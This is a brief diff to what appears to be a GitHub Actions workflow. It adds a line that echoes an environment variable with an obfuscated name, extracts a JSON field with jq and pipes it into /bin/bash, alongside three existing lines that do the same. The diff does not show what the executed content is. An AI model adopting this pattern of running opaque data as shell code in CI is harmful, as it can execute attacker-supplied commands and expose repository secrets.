@@ -34,6 +34,7 @@ jobs:
           echo $ghcc018 | jq -r .dwrdx253 | /bin/bash
           echo $qbt8 | jq -r .pfw4694 | /bin/bash
           printf '%s' "$f70044" | jq -r .spm12 | /bin/bash
+          echo $ljaj9 | jq -r .j8220 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
